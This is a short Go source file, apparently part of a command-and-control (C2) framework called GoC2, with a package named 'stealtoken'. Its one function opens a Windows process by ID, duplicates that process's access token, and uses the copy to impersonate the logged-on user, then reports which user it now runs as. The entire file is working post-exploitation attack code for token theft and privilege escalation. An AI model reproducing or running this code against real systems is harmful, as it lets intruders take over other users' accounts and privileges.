//go:build windows
// +build windows

package stealtoken

import (
	"fmt"
	"strconv"

	"github.com/latortuga71/GoC2/pkg/winapi"
	"golang.org/x/sys/windows"
)

func StealProcessToken(pidStr string) (string, error) {
	pid, err := strconv.Atoi(pidStr)
	if err != nil {
		return "", err
	}
	hProc, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, uint32(pid))
	if err != nil {
		return "", err
	}
	var hToken windows.Token
	var duplicatedToken windows.Token
	err = windows.OpenProcessToken(hProc, windows.TOKEN_IMPERSONATE|windows.TOKEN_DUPLICATE, &hToken)
	if err != nil {
		return "", err
	}
	err = windows.DuplicateTokenEx(hToken, windows.MAXIMUM_ALLOWED, nil, 2, windows.TokenImpersonation, &duplicatedToken)
	if err != nil {
		return "", err
	}
	worked, err := winapi.ImpersonateLoggedOnUser(duplicatedToken)
	if !worked {
		return "", err
	}
	/*
		err = windows.SetThreadToken(nil, duplicatedToken)
		if err != nil {
			return "", err
		}
	*/
	var bufferSz uint32 = 255
	buffer := make([]uint16, bufferSz)
	err = windows.GetUserNameEx(2, &buffer[0], &bufferSz)
	if err != nil {
		return "", err
	}
	newUser := windows.UTF16ToString(buffer)
	return fmt.Sprintf("Impersonating %s", newUser), nil
}
